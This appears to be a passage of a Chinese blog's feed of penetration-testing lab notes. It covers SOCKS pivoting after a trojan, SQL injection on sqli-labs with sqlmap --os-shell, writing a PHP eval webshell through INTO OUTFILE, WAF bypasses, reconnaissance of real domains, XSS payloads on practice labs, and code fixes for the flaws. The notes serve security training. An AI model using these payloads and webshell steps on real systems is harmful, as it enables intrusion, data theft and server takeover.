+nat\vmnet1
+192.168.18.143、192.168.159.10
+
+
+win7pc2
+vmnet1
+192.168.159.20
+
+
+此时win11无法ping通pc2，kali也无法ping通pc2
+
+
+上线木马之后，开启sock代理
+
+
+查看代理设置
+
+这里端口就是服务端socks监听端口，去服务端查看端口是否开启
+netstat -tunlp | grep &lt;你开启的socks端口&gt;
+
+
+编辑配置文件，挂上团队服务socks
+/etc/proxchains.conf
+
+再nmap进行扫描
+
+成功扫描到pc2
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-sql注入</title>
+    <url>/2025/08/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(1)/</url>
+    <content><![CDATA[1、使用sqlilab演示数字型注入和字符型注入的区别，以及四种sql注入类型，截图说明每一步的含义①字符型后端输入参数的类型，如果是id&#x3D;’$id’，则代表是字符型
+
+
+当输入1和2-1的时候，页面回显不一样，参数没有进行运算，，代表是字符型，若是数字型则会进行运算
+②数字型后端参数如果是id&#x3D;$id，则代表是数字型
+
+
+当输入1和2-1时，页面回显一样，参数进行了运算，则代表是数字型
+③联合查询使用union语句，表示同前一语句一起执行，要使用union进行联合查询，必须使select字段数与前语句字段数一致，否则不能成功执行
+
+判断字段数order by进行报错，若输入数值小于或等于字段数，则正常回显，若大于字段数则发生报错
+order by 数值?id=1&#x27; order by 4 --+//--+表示注释后面语句
+
+
+页面发生报错
+换个值order by 3
+
+页面正常回显，证明存在三个字段
+
+显示字段回显为使我们想要获取的数据正确回显，要查看页面回显位置
+?id=-1&#x27; union select 1,2,3 --+//id输入一个不存在的值，则返回空，才能看见我们想看见的
+
+
+
+联合注入注入sql语句，进行执行
+//查询当前数据库名?id=-1&#x27; union select 1,database(),3 --+//查询当前数据库所有表名?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+//获取表中字段名?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+//获取数据?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users --+
+
+
+拿到数据库名
+
+拿到表名
+
+拿到字段名
+
+拿到数据
+
+报错注入利用页面的报错信息，将想要的数据提取出来，这些函数优先级较高，所以会先执行
+//函数extractvalue()updatexml()exp()floor()
+
+利用extractvalue进行注入
+//获取数据库名?id=1&#x27; and extractvalue(1,concat(1,(select database()))) --+//获取表名?id=1&#x27; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))) --+//获取字段名?id=1&#x27; and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))) --+//获取数据?id=1&#x27; and extractvalue(concat(1,(select group_concat(username) from security.users))) --+
+
+
+拿到数据库名
+
+拿到表名
+
+拿到字段名
+
+
+布尔盲注页面没有明确回显有效信息，只能根据页面回显效果来进行判断
+//函数length()substr()ascii()
+
+一个个试太麻烦，为了方便可以利用yakit或者burp
+//判断数据库字长?id=1&#x27; and length(database())=7 --+?id=1&#x27; and length(database())=8 --+//判断数据库名?id=1&#x27; and ascii(substr(database(),1,1))=115 --+?id=1&#x27; and ascii(substr(database(),2,1))=105 --+
+
+
+利用页面的正常回显来判断，最后组合字符
+
+时间盲注页面没有明确回显信息，可以利用响应时间判断
+//函数if()sleep()bentchmark()substr()length()
+
+可以利用burp或yakit辅助
+//判断数据库名字长?id=1&#x27; and if(length(database())=8,sleep(5),1) --+
+
+
+通过响应时间进行判断
+
+
+2、对自己上周编写的网站进行sql注入的尝试①判断注入类型?id=1&#x27;?id=2?id=2-1
+
+
+
+
+页面回显一致，证明是字符型
+②判断列数?id=1&#x27; order by 3 --+?id=1&#x27; order by 4 --+
+
+
+
+字段数为3
+③判断回显?id=-1&#x27; union select 1,2,3 --+
+
+
+④查询数据库名?id=-1&#x27; union select 1,database(),3 --+
+
+
+⑤查询表名?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;cms&#x27; --+
+
+
+只有一个表
+⑥查询字段名?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;cms&#x27; and table_name=&#x27;user&#x27; --+
+
+
+⑦获取数据?id=-1&#x27; union select 1,group_concat(uname),group_concat(pass) from cms.user --+
+
+
+3、使用sqlmap注入出靶场网站的所有数据库sqlmap -u &quot;xxx.com?id=&quot;-u //指定目标url--data=&quot;&quot; //post注入，如&quot;user=admin&amp;password=admin123&quot;-r //指定http请求文件，适用于post--dbs //列出该网站所有数据库--batch //默认指令--current-db //获取当前数据库名-D //指定数据库--tables //列出表名-T //指定表--columns //列出字段名-C //指定字段--dump //获取数据
+
+
+
+获取到所有库名
+扩展尝试编写代码修复sql注入漏洞原代码
+&lt;?php$servername = &quot;localhost&quot;;$dbusername = &quot;root&quot;;$dbpassword = &quot;123456&quot;;$dbname = &quot;cms&quot;;// 创建连接$conn = new mysqli($servername, $dbusername, $dbpassword, $dbname);if (isset($_GET[&#x27;id&#x27;]) &amp;&amp; !empty($_GET[&#x27;id&#x27;])) &#123;    $id = $_GET[&#x27;id&#x27;];        // 准备和绑定        $sql=&quot;SELECT id, uname, pass FROM user WHERE id = &#x27;$id&#x27;&quot;;        $result = mysqli_query($conn,$sql);        $row = mysqli_fetch_assoc($result);    &#125; else &#123;        $error = &quot;请输入ID&quot;;&#125;
+
+可以进行正则匹配，限定字符
+改后
+//使输入必须为数字if (!preg_match(&#x27;/^[0-9]+$/&#x27;, $id)) &#123;     die(&#x27;非法输入：ID必须是数字&#x27;);&#125;
+
+然后继续进行注入试试
+
+成功限制
+思考假如传参方式是post，sqlmap该如何使用post可以利用
+--data参数或者-r参数指定文件
+
+sqlmap -u &quot;xxx.com&quot; --data&quot;username=admin&amp;password=123&quot;
+
+
+成功进行注入
+//创建一个http请求的txt文件vim test.txt
+
+
+然后进行注入
+sqlmap -r test.txt --batch --dbs
+
+
+
+成功注入
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-sql注入(2)</title>
+    <url>/2025/08/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(2)/</url>
+    <content><![CDATA[1、手工注入的方式写入一句话木马一句话木马
+&lt;?php @eval($_GET[&#x27;abc&#x27;]);?&gt;
+
+利用sql注入webshell
+//条件当前连接数据库用户为root知道写入绝对路径secure_file_priv配置，并且为空
+
+进入靶场mysql配置文件my.ini，mysql默认不配置这个选项，需要手动加进去,一般secure_file_priv在后面的版本应该写在[mysqld]这一栏下
+
+绝对路径一般靠猜，比如linux系统的var&#x2F;www&#x2F;html，Windows系统的inetpub\wwwroot、
+既然存在sql注入，可以利用sql注入查看数据库路径来猜测网站路径
+?id=-1&#x27; union select 1,2,@@datadir --+@@datadir 是一个 MySQL 系统变量，用于显示 MySQL 服务器将数据文件存储在哪一个目录路径下。简单来说，它就是 MySQL 的“数据仓库”或“数据家园”的位置
+
+
+得知mysql在c盘下的C:\XAMPP2\mysql\data\，一般Windows系统启用apache时web通常在Apache24\htdocs这个目录下，根据url显示的sqli-labs，猜测目录是C:\Apache24\htdocs\sqli-labs这个目录，由于靶场使用的是XAMPP部署网站，这里靶场实际目录是C:\XAMPP2\htdocs\sqli-labs\
+查看当前连接的用户
+?id=-1&#x27; union select 1,2,user() --+
+
+
+由此可以进行写入webshell
+//函数into outfileinto dumpfile
+
+进入靶场，url输入
+?id=1&#x27; union select 0x3c3f70687020406576616c28245f4745545b27616263275d293b3f3e into outfile &#x27;C:\XAMPP2\htdocs\sqli-labs\shell.php&#x27; --+0x3c3f70687020406576616c28245f4745545b27616263275d293b3f3e为16进制编码，前面的0x让服务器识别这是16进制
+
+
+页面无正常回显，看看目录下
+
+成功写入，我们去浏览器访问这个文件，并输入
+?adc=system(ipconfig);
+
+
+成功注入，拿到权限
+2、sqlmap工具–os-shell自动化写入webshell，利用sqlmap
+来到一个存在sql注入的地方
+获取url，然后发给sqlmap
+sqlmap -u &quot;http://192.168.18.173/good.php?id=1&quot; --os-shell --batch
+
+
+成功执行
+3、宽字节注入，堆叠注入，二次注入，万能密码以及相关原理①宽字节注入后端对输入参数进行处理时，对于一些特殊符号如’ “等进行了\转义处理，并且数据库使用了GBK编码，在进行注入时，加入一些特殊二字节的值与其\进行拼接，此时服务端会认为是一个汉字，从而消除\转义作用，达到绕过
+less-32关
+?id=1%db%27 --+%db是某一字符%27是&#x27;当%db和\进行组合时变成一个汉字
+
+
+完成绕过，随后sql语句和普通联合查询一样，但是前面仍然要绕过\
+②堆叠注入后端使用mysqli_multi_query() ，允许同时执行多条语句，使用；进行分割
+less-38关
+//利用可执行多条sql语句执行插入一个新用户?id=1&#x27;;insert into users(id,username,password)values(29,&#x27;caixukun&#x27;,&#x27;521314&#x27;)--+
+
+
+
+成功执行
+③二次注入数据库在保存数据的时候，保存的是原本的数据，没有对一些特殊字符进行转义，但后端在提取数据的时候，也没有进行转义，导致数据和语句进行了闭合拼接引发的错误
+注册一个admin&#x27;#的用户后端处理数据代码为id=&#x27;$id&#x27;此时对admin&#x27;#这个用户进行操作时后端参数是id=&#x27;admin&#x27;#&#x27;#把后面进行了注释，所以实际操作的用户是admin
+
+less-24
+
+我们登录进去密码是123456
+
+我们修改密码为qwe123
+
+使用admin和qwe123进行登录
+
+成功登录
+④万能密码后端代码
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;当输入admin&#x27; or &#x27;1&#x27; = &#x27;1&#x27;#时后端代码就变成@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; or &#x27;1&#x27; = &#x27;1&#x27;#&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;此时#后面代码被注释，前面只校验了一个用户名为admin，且前面语句为真，当存在这个账户时，不用密码，就可以绕过直接登录
+
+
+4、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称将安全狗安装在服务器上
+访问靶场进行注入
+
+发现被拦截，此时去验证拦截的那个字符
+
+‘未被拦截
+
+order by –+也未被拦截
+
+union也未被拦截
+
+select被拦截
+绕过
+
+大小写绕过
+
+?id=-1&#x27; union SElect 1,2,3--+
+
+
+失败
+
+双写绕过
+
+?id=-1&#x27; union seselectlect 1,2,3 --+
+
+
+看似绕过但是语句行不通
+
+编码绕过
+
+//url编码select-1&#x27; union select 1,2,3 --+-1&#x27; union  1,2,3 --+
+
+还是不行
+打不过waf
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-sql注入(3)</title>
+    <url>/2025/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(3)/</url>
+    <content><![CDATA[1、修复sqli-lab靶场的宽字节注入、万能密码、二次注入、堆叠注入①宽字节注入修复原代码
+&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_addslashes($string)&#123;    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash              return $string;&#125;// take the variables if(isset($_GET[&#x27;id&#x27;]))&#123;$id=check_addslashes($_GET[&#x27;id&#x27;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);//使用了GBK编码$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);	if($row)	&#123;  	echo &#x27;&lt;font color= &quot;#00FF00&quot;&gt;&#x27;;	  	echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];  	echo &quot;&lt;br&gt;&quot;;  	echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];  	echo &quot;&lt;/font&gt;&quot;;  	&#125;	else 	&#123;	echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;	print_r(mysql_error());	echo &quot;&lt;/font&gt;&quot;;  	&#125;&#125;	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;                ?&gt;
+
+将mysql_query(“SET NAMES gbk”);删除，不设置连接字符集为gbk
+测试输入
+?id=1%db&#x27; and 1=2 --+
+
+
+成功将‘按原计划进行了转义处理，防止了宽字节注入
+②万能密码修复原代码
+   $uname=$_POST[&#x27;uname&#x27;];$passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname);fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);
+
+将代码改为
+function check($string) &#123;    // 使用preg_replace匹配除了字母和数字以外的所有字符，并替换为空    return preg_replace(&#x27;/[^a-zA-Z0-9]/&#x27;, &#x27;&#x27;, $string);&#125;  $checkname=check($uname);	// connectivity 	@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$checkname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;	$result=mysql_query($sql);	$row = mysql_fetch_array($result);
+
+
+成功防御
+③二次注入原代码
+if (isset($_POST[&#x27;submit&#x27;]))&#123;			# Validating the user input........	$username= $_SESSION[&quot;username&quot;];	$curr_pass= mysql_real_escape_string($_POST[&#x27;current_password&#x27;]);	$pass= mysql_real_escape_string($_POST[&#x27;password&#x27;]);	$re_pass= mysql_real_escape_string($_POST[&#x27;re_password&#x27;]);	
+
+改为
+function check($string) &#123;    // 使用preg_replace匹配&#x27; &quot; # 进行转义处理    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);      $string = preg_replace(&#x27;/\#/&#x27;, &quot;\\\#&quot;, $string);     return $string; &#125;	# Validating the user input........	$username= check($_SESSION[&quot;username&quot;]);
+
+
+进行修改密码
+
+并未修改admin账户的密码，成功防止注入
+④堆叠注入原代码
+if (mysqli_multi_query($con1, $sql))&#123;            /* store first result set */    if ($result = mysqli_store_result($con1))    &#123;        if($row = mysqli_fetch_row($result))        &#123;            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;	            printf(&quot;Your Username is : %s&quot;, $row[1]);            echo &quot;&lt;br&gt;&quot;;            printf(&quot;Your Password is : %s&quot;, $row[2]);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        &#125;//            mysqli_free_result($result);    &#125;
+
+原代码使用了mysqli_multi_query，这个允许执行多条sql语句
+//添加// 防御堆叠注入，过滤分号及其编码形式和其他可能的语句分隔符$id = preg_replace(&#x27;/;|%3B|%3b|\x3B|%0D|%0A|\r|\n/&#x27;, &#x27;&#x27;, $id);// 验证ID是否为数字if(!is_numeric($id)) &#123;    die(&#x27;请输入数字&#x27;);&#125;
+
+测试
+
+
+注入失败，并未插入数据，防御成功
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-信息收集</title>
+    <url>/2025/08/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[！！！不要对互联网未授权资产做主动信息收集
+1、针对xiusafe.com域名，尝试绕过cdn①cdn简介CDN 的全称是 Content Delivery Network，即内容分发网络；
+CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。 关键技术：内容存储与分发技术
+②cdn检测如何检测一个网站是否使用了cdn服务
+
+nslookup&amp;pingnslookup xxx.comping xxx.com
+
+
+
+
+可以看到并非同一ip，推测使用了cdn服务
+
+多地ping测试使用在线平台测试
+https://ping.chinaz.com/
+
+
+
+可以看到ping到39个ip，由此确定使用了cdn服务
+③绕过cdn
+国外主机访问该站使用的cdn服务只在国内具有节点服务器，国外不存在节点服务器，当使用国外主机进行访问的时候，可能访问到真实ip
+https://ping.chinaz.com/
+
+
+
+这个方法貌似行不通，存在三个ip
+
+DNS记录查看历史DNS记录，可能存在使用cdn之前的ip
+微步在线，https://x.threatbook.cn/
+
+
+
+解析到133条记录，可以挨个通过ip去进行访问，若是访问到，那就是真实ip，最好从后往前去访问
+
+子域名查询有些网站只对主域名使用了cdn服务，但是子域名没有，且主域名和子域名指向同一台服务器，查到子域名后对子域名进行dns解析，可能查到真实ip
+在线平台
+https://sitereport.netcraft.com/
+
+https://site.ip138.com/
+
+
+网络空间引擎FOFA https://fofa.info/
+直接搜索域名
+
+
+
+看到有一个ip，并且也搜到了cdn服务商，直接去访问ip地址
+
+成功拿到真实ip
+
+查看网站源代码有些网站源代码可能藏有有用信息
+
+
+
+这个网站源码貌似没有有用信息
+2、针对testfire.net网站，进行信息收集①资产收集通过搜索语法进行收集，资产存在哪些敏感页面，如登录框，后台等，可以作为攻击点，同时也可以查询旁站，旁站防御力弱，容易攻击，可以作为跳板
+site:testfire.netinurl:login/admin
+
+
+②子域名收集使用yakit的子域名收集功能，搜索更多有用信息
+
+看到该服务器貌似还开启了ftp服务，可以尝试ftp爆破，并且暴露了ip
+③whois信息通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等
+使用站长之家的whois查询功能，直接搜索域名
+https://whois.chinaz.com/
+
+查找到一些信息
+④端口扫描扫描端口和已经开放的服务，作为攻击点
+使用nmap扫描
+nmap -sS 65.61.137.117
+
+
+可以看到使用smtp和pop3邮件服务，可以尝试对此服务进行攻击
+⑤网站架构使用插件wappalyzer
+有些网站可能会暴露中间件，框架的版本信息，可以利用这些信息去找相关漏洞
+
+⑥网站前端源码有些开发者可能会将敏感信息存在前端源码的注释中
+
+⑦目录扫描可以找网站存在哪些敏感文件，或者后台
+
+⑧c段收集使用fofa进行搜索同一网段下的其他服务器，有可能他们属于同一内网，对其他薄弱服务器进行攻击
+
+⑨指纹识别了解网站架构，方便利用
+http://sso.tidesec.com/
+
+]]></content>
+  </entry>
+  <entry>
+    <title>渗透测试-xss注入</title>
+    <url>/2025/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xss%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[1、反射型xss恶意脚本作为请求的一部分（通常藏在URL参数中）发送给服务器，服务器在未经验证的情况下直接将包含恶意脚本的响应返回给用户的浏览器。浏览器执行该脚本。
+①low输入payload
+&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
+
+
+点击submit
+
+成功弹窗！！！
+②medium源码
+&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;    // Get input    $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;
+
+将匹配到的替换为空
+payload
+//双写&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
+
+
+//大小写&lt;SCript&gt;alert(&#x27;xss&#x27;)&lt;/SCript&gt;
+
+
+//既然不让用script标签，就换标签&lt;img src=1 onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;
+
+
+成功弹窗！！！
+③high源码
+&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;    // Get input    $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;
+
+对匹配到的字符串进行多次过滤，并且大小写不敏感，所以不能使用大小写和双写绕过
+payload
+//img标签&lt;img src=1 onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;
+
+
+成功弹窗！！！
+2、三种XSS漏洞以及三者的区别①反射型反射型xss将输入的数据，经过后端处理后，返回到前端代码中，属于一次性攻击，下一次访问时不会触发，如搜索框
+
+②存储型存储型xss将输入的数据保存在数据库里，再返回到前端代码里，属于持久性攻击，下一次访问时会从数据库调取资源导致触发，如留言板
+
+提交数据保存
+
+然后去到其他页面，再重新访问这个页面
+
+③dom型DOM 型 XSS 攻击不同于传统的存储型 XSS，它发生在客户端，不经过服务器，通过操作 DOM 实现攻击，如url，输入框
+
+3、xss-lab1-8实战①lab1&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;
+
+并未做任何防护措施，直接将用户的输入返回，直接构造xss语句
+&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
+
+
+成功弹窗！！！
+②lab2&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;
+
+虽然将第一个回显位进行了html实体编码处理，但是第二个回显位未进行处理，可以在第二个回显位做文章
+&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;由于value是使用双引号包裹字符的，所以构造&quot;&gt;与前面进行闭合payload：&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;构造完之后代码拼接为&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;
+
+
+成功弹窗！！！
+③lab3&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;
+
+此处对两个回显位都做了实体编码，实体编码默认情况下会对&amp; &quot; &lt; &gt;这四个符号进行编码，但是默认情况不对 &#39; 进行编码
+对第二个回显位进行构造
+&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;构造鼠标点击事件，由于是使用&#x27;包裹字符，所以使用&#x27;进行闭合payload：&#x27; onclick=&#x27;alert(/xss/)构造完之后代码拼接为&lt;input name=keyword  value=&#x27;&#x27; onclick=&#x27;alert(/xss/)&#x27;&gt;
+
+
+成功弹窗！！！
+④lab4&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;
+
+这里对&lt;&gt;进行了过滤，并且在第一个回显位做了实体编码，但是第二个回显位没做实体编码
+&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;可以再此使用上一关payload，但是这里用的是双引号包裹字符串，做一下变换payload：&quot; onclick=&quot;alert(/xss/)
+
+
+成功弹窗！！！
+⑤lab5&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;
+
+这里将输入数据全进行了小写转换，并且过滤了script和on，第一个回显位做了实体编码，第二个回显位未做实体编码，这里需要运用到标签，这个标签会生成一个超链接
+payload：&quot;&gt;&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;123&lt;/a&gt;
+
+
+成功弹窗！！！
+⑥lab6&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;
+
+对script,on,src,data,href进行了过滤，并且在第一个回显位做了实体编码，但是没有大小写敏感，尝试大小写绕过
+&quot;&gt;&lt;SCriPt&gt;alert(&#x27;xss&#x27;)&lt;/ScRIpt&gt;
+
+
+⑦lab7&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;
+
+这里做了小写转换，并且将匹配的字符串替换为空，尝试进行双写绕过
+&quot;&gt;&lt;scriscriptpt&gt;alert(&#x27;xss&#x27;)&lt;/scrscriptipt&gt;
+
+
+成功弹窗！！！
+⑧lab8&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;
+
+这里将输入数据全进行了小写转换，并且过滤了许多字符串并且做了实体编码，这里将输入内容生成了个超链接
+
+href标签特性，当点击超链接时，浏览器会自动对16进制实体编码进行解析，但输入数据时，服务器未做解析，所以就可以绕过后端代码的过滤处理，最后点击链接
